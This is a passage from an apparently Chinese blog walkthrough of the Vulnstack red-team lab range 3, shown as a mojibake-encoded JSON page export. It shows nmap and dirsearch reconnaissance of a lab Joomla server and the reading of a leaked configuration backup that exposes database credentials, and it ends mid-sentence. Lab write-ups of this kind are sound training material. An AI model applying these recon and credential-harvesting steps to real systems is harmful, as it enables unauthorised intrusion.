{"pageProps":{"postData":{"id":"Vulnstackçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº(ä¸‰)","contentHtml":"<h1>ATT&#x26;CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº(ä¸‰)</h1>\n<blockquote>\n<p><a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/5/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</a></p>\n</blockquote>\n<h2>é¶åœºæ­å»º</h2>\n<ol>\n<li>ä¿®æ”¹ä»…ä¸»æœºç½‘å¡ A IPä¸º<code>192.168.93.0</code> ï¼Œç„¶ååœ¨æ·»åŠ ä¸€å¼ ä»…ä¸»æœºç½‘å¡Bï¼Œipéšæ„ï¼Œæˆ‘è¿™é‡Œä¸º<code>192.168.213.0</code> ç½‘æ®µ</li>\n<li>webä¸»æœºç½‘å¡å†…ç½‘è®¾ç½®ç½‘å¡ Aï¼Œå‡ºå£ç½‘å¡ä¸ºç½‘å¡B</li>\n<li>å…¶ä½™ä¸»æœºç½‘å¡éƒ½æ˜¯ä»…ä¸»æœºç½‘å¡ A</li>\n<li>å†…ç½‘æµ‹è¯•ï¼Œè®¿é—®webä¸»æœºæœåŠ¡æ˜¯å¦æ­£å¸¸</li>\n</ol>\n<p><strong>ç›®æ ‡ï¼šåŸŸæ§ä¸­å­˜åœ¨ä¸€ä»½é‡è¦æ–‡ä»¶ã€‚</strong></p>\n<h2>ä¸»æœºå‘ç°ç«¯å£æ‰«æ</h2>\n<ol>\n<li>\n<p>æ‰«æç½‘æ®µå†…å­˜æ´»ä¸»æœº</p>\n<pre><code class=\"hljs language-python\">nmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>                                      \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">37</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.000072</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:08 (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00011</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00025</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:C9 (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.254</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00012</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F1:A9:3F (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.129</span>\n</code></pre>\n<p>æ ¹æ®é¶æœºæ˜¯æˆ‘æ·»åŠ çš„æœ€åä¸€å°é¶æœºï¼Œæ‰€ä»¥é¶æœºIPæ˜¯<code>156</code> ï¼Œ<code>kali</code> çš„IPæ˜¯<code>150</code></p>\n</li>\n<li>\n<p>æ‰«æé¶æœºç«¯å£</p>\n<pre><code class=\"hljs language-python\">nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">38</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00057</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:C9 (VMware)\n</code></pre>\n<p><code>SSH</code>ï¼Œ<code>WEB</code>ï¼Œ<code>MYSQL</code>ç«¯å£</p>\n</li>\n<li>\n<p>æ‰«æä¸»æœºæœåŠ¡ç‰ˆæœ¬ä»¥åŠç³»ç»Ÿç‰ˆæœ¬</p>\n<pre><code class=\"hljs language-python\">nmap -sV -sT -O -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>                  \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">39</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00037</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">5.3</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http    nginx <span class=\"hljs-number\">1.9</span><span class=\"hljs-number\">.4</span>\n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql   MySQL <span class=\"hljs-number\">5.7</span><span class=\"hljs-number\">.27</span>-0ubuntu0<span class=\"hljs-number\">.16</span><span class=\"hljs-number\">.04</span><span class=\"hljs-number\">.1</span>\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:C9 (VMware)\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X|<span class=\"hljs-number\">3.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.32</span> - <span class=\"hljs-number\">3.10</span>\n</code></pre>\n</li>\n<li>\n<p>æ‰«æä¸»æœºæœåŠ¡æ¼æ´ï¼Œä½¿ç”¨<code>nmap</code>æ‰«æ</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>                                                                                                                                                               \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">25</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">39</span> CST                                                                                                                                                \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>                                                                                                                                                                              \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00049</span>s latency).                                                                                                                                                                                    \n                                                                                                                                                                                                                  \nPORT     STATE SERVICE                                                                                                                                                                                            \n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh                                                                                                                                                                                                \n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http                                                                                                                                                                                               \n               \n| http-dombased-xss:                                \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>                          \n|   Found the following indications of potential DOM based XSS:                                          \n|                                                   \n|     Source: window.<span class=\"hljs-built_in\">open</span>(this.href,<span class=\"hljs-string\">'win2'</span>,<span class=\"hljs-string\">'status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'</span>)\n|_    Pages: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>/index.php/<span class=\"hljs-number\">3</span>-welcome-to-your-blog, http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>:<span class=\"hljs-number\">80</span>                                        \n| http-enum:                                        \n|   /administrator/: Possible admin folder          \n|   /administrator/index.php: Possible admin folder                                                      \n|   /robots.txt: Robots file                        \n|   /administrator/manifests/files/joomla.xml: Joomla version <span class=\"hljs-number\">3.9</span><span class=\"hljs-number\">.12</span>                                     \n|   /language/en-GB/en-GB.xml: Joomla version <span class=\"hljs-number\">3.9</span><span class=\"hljs-number\">.12</span>                                                     \n|   /htaccess.txt: Joomla!                          \n|   /README.txt: Interesting, a readme.             \n|   /<span class=\"hljs-built_in\">bin</span>/: Potentially interesting folder           \n|   /cache/: Potentially interesting folder         \n|   /images/: Potentially interesting folder        \n|   /includes/: Potentially interesting folder      \n|   /libraries/: Potentially interesting folder     \n|   /modules/: Potentially interesting folder       \n|   /templates/: Potentially interesting folder     \n|_  /tmp/: Potentially interesting folder           \n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql                                \n|_mysql-vuln-cve2012-<span class=\"hljs-number\">2122</span>: ERROR: Script execution failed (use -d to debug)                              \nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">46</span>:C9 (VMware)             \n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">75.86</span> seconds \n</code></pre>\n<p><code>80</code>ç«¯å£æšä¸¾å‡ºå¾ˆå¤šè·¯å¾„ï¼Œä»¥åŠCMSä¼°è®¡æ˜¯<code>Joomla</code> ï¼Œ<code>3306</code>ç«¯å£å‘ç°<code>cve2012-2122</code> ï¼Œä½†æ˜¯è„šæœ¬æ³¨å…¥å¤±è´¥</p>\n<p>ä¼˜å…ˆçº§ï¼š<code>80</code>><code>3306</code>><code>22</code></p>\n</li>\n</ol>\n<h2>WEBæ¸—é€</h2>\n<ol>\n<li>\n<p>è®¿é—®ä¸»é¡µï¼Œç½‘ç«™æŒ‡çº¹è¯†åˆ«</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image39.png\" alt=\"image.png\"></p>\n<p>å½“å‰ç½‘ç«™CMSæ˜¯<code>Joomla 3.9.12</code>ï¼Œ<code>Nginx</code>ï¼Œå¹¶ä¸”æ˜¯åå‘ä»£ç†çš„</p>\n</li>\n<li>\n<p>æ‰«æä¸€ä¸‹ç½‘ç«™ç›®å½•</p>\n<pre><code class=\"hljs language-python\">dirsearch -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span> -e php,<span class=\"hljs-built_in\">zip</span>,html,txt                                                                                                             \n//                                                                                                             \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">25</span>] Starting:                                                                                         \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">30</span>] <span class=\"hljs-number\">200</span> -   24KB - /<span class=\"hljs-number\">1.</span>php                                                                                                                                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">301</span> -  326B  - /administrator  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/administrator/                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -    2KB - /administrator/                                                                    \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -  527B  - /administrator/includes/                                                           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -   31B  - /administrator/cache/                                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -   31B  - /administrator/logs/                                                               \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">200</span> -    2KB - /administrator/index.php                                                           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">38</span>] <span class=\"hljs-number\">301</span> -  331B  - /administrator/logs  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/administrator/logs/                \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">42</span>] <span class=\"hljs-number\">301</span> -  316B  - /<span class=\"hljs-built_in\">bin</span>  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/<span class=\"hljs-built_in\">bin</span>/                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">42</span>] <span class=\"hljs-number\">200</span> -   31B  - /<span class=\"hljs-built_in\">bin</span>/                                                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">43</span>] <span class=\"hljs-number\">301</span> -  318B  - /cache  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/cache/                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">43</span>] <span class=\"hljs-number\">200</span> -   31B  - /cache/                                                                            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">200</span> -   31B  - /cli/                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">301</span> -  323B  - /components  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/components/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">44</span>] <span class=\"hljs-number\">200</span> -   31B  - /components/                                       \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -    0B  - /configuration.php           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -    2KB - /configuration.php~          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">52</span>] <span class=\"hljs-number\">200</span> -    1KB - /htaccess.txt                \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">301</span> -  319B  - /images  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/images/\n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -   31B  - /images/                                                                           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">301</span> -  321B  - /includes  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/includes/                                                                                                                                         \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -   31B  - /includes/                                     \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -    4KB - /index.php           \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -    3KB - /index.php/login/                                                                  \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">301</span> -  321B  - /language  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/language/                                    \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">200</span> -   31B  - /layouts/                                                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">56</span>] <span class=\"hljs-number\">301</span> -  322B  - /libraries  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/libraries/                                  \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">56</span>] <span class=\"hljs-number\">200</span> -   31B  - /libraries/                                                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">56</span>] <span class=\"hljs-number\">200</span> -    7KB - /LICENSE.txt                                                                       \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">301</span> -  318B  - /media  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/media/                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">200</span> -   31B  - /media/                                                                            \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">301</span> -  320B  - /modules  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/modules/                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">59</span>] <span class=\"hljs-number\">200</span> -   31B  - /modules/                                                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:05] <span class=\"hljs-number\">301</span> -  320B  - /plugins  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/plugins/                                      \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:05] <span class=\"hljs-number\">200</span> -   31B  - /plugins/                                                                          \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:07] <span class=\"hljs-number\">200</span> -    2KB - /README.txt                                                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:08] <span class=\"hljs-number\">200</span> -  392B  - /robots.txt                                                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">301</span> -  322B  - /templates  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/templates/                                  \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -   31B  - /templates/                                                                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -   31B  - /templates/index.html                                                              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -    0B  - /templates/beez3/                                                                  \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -    0B  - /templates/protostar/        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] <span class=\"hljs-number\">200</span> -    0B  - /templates/system/                                 \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">301</span> -  316B  - /tmp  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.213</span><span class=\"hljs-number\">.130</span>/tmp/              \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">15</span>] <span class=\"hljs-number\">200</span> -   31B  - /tmp/                        \n[<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">19</span>] <span class=\"hljs-number\">200</span> -  628B  - /web.config.txt         \n</code></pre>\n<ul>\n<li>\n<p><code>1.php</code> æ˜¯<code>phpinfo</code></p>\n</li>\n<li>\n<p><code>/administrator</code> ç™»é™†é¡µé¢</p>\n</li>\n<li>\n<p><code>/configuration.php~</code> <code>Joomle</code>çš„é…ç½®æ–‡ä»¶</p>\n<p>å—¯ï¼Ÿè¿˜æœ‰å›æ˜¾ï¼Œè®¿é—®å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯</p>\n<pre><code class=\"hljs language-python\">Ã¨Â¯Â·Ã§Â¨ÂÃ¥â‚¬â„¢Ã¨Â®Â¿Ã©â€”Â®Ã£â‚¬â€š<span class=\"hljs-string\">';\n\tpublic $display_offline_message = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $offline_image = '</span><span class=\"hljs-string\">';\n\tpublic $sitename = '</span>test<span class=\"hljs-string\">';\n\tpublic $editor = '</span>tinymce<span class=\"hljs-string\">';\n\tpublic $captcha = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $list_limit = '</span><span class=\"hljs-number\">20</span><span class=\"hljs-string\">';\n\tpublic $access = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $debug = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $debug_lang = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $debug_lang_const = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $dbtype = '</span>mysqli<span class=\"hljs-string\">';\n\tpublic $host = '</span>localhost<span class=\"hljs-string\">';\n\tpublic $user = '</span>testuse<span class=\"hljs-string\">r';\n\tpublic $password = '</span>cvcvgjASD!@<span class=\"hljs-string\">';\n\tpublic $db = '</span>joomla<span class=\"hljs-string\">';\n\tpublic $dbprefix = '</span>am2zu_<span class=\"hljs-string\">';\n\tpublic $live_site = '</span><span class=\"hljs-string\">';\n\tpublic $secret = '</span>gXN9Wbpk7ef3A4Ys<span class=\"hljs-string\">';\n\tpublic $gzip = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $error_reporting = '</span>default<span class=\"hljs-string\">';\n\tpublic $helpurl = '</span>https://<span class=\"hljs-built_in\">help</span>.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&#x26;lang={langcode}<span class=\"hljs-string\">';\n\tpublic $ftp_host = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_port = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_user = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_pass = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_root = '</span><span class=\"hljs-string\">';\n\tpublic $ftp_enable = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $offset = '</span>UTC<span class=\"hljs-string\">';\n\tpublic $mailonline = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $mailer = '</span>mail<span class=\"hljs-string\">';\n\tpublic $mailfrom = '</span>test@test.com<span class=\"hljs-string\">';\n\tpublic $fromname = '</span>test<span class=\"hljs-string\">';\n\tpublic $sendmail = '</span>/usr/sbin/sendmail<span class=\"hljs-string\">';\n\tpublic $smtpauth = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $smtpuser = '</span><span class=\"hljs-string\">';\n\tpublic $smtppass = '</span><span class=\"hljs-string\">';\n\tpublic $smtphost = '</span>localhost<span class=\"hljs-string\">';\n\tpublic $smtpsecure = '</span>none<span class=\"hljs-string\">';\n\tpublic $smtpport = '</span><span class=\"hljs-number\">25</span><span class=\"hljs-string\">';\n\tpublic $caching = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $cache_handler = '</span>file<span class=\"hljs-string\">';\n\tpublic $cachetime = '</span><span class=\"hljs-number\">15</span><span class=\"hljs-string\">';\n\tpublic $cache_platformprefix = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $MetaDesc = '</span><span class=\"hljs-string\">';\n\tpublic $MetaKeys = '</span><span class=\"hljs-string\">';\n\tpublic $MetaTitle = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $MetaAuthor = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $MetaVersion = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $robots = '</span><span class=\"hljs-string\">';\n\tpublic $sef = '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">';\n\tpublic $sef_rewrite = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $sef_suffix = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $unicodeslugs = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n\tpublic $feed_limit = '</span><span class=\"hljs-number\">10</span><span class=\"hljs-string\">';\n\tpublic $feed_email = '</span>none<span class=\"hljs-string\">';\n\tpublic $log_path = '</span>/var/www/html/administrator/logs<span class=\"hljs-string\">';\n\tpublic $tmp_path = '</span>/var/www/html/tmp<span class=\"hljs-string\">';\n\tpublic $lifetime = '</span><span class=\"hljs-number\">15</span><span class=\"hljs-string\">';\n\tpublic $session_handler = '</span>database<span class=\"hljs-string\">';\n\tpublic $shared_session = '</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">';\n}\n</span></code></pre>\n<p>å¾—åˆ°äº†æ•°æ®åº“è´¦å·<code>testuser</code>å¯†ç <code>cvcvgjASD!@</code> ï¼Œä»¥åŠç½‘ç«™çš„æ 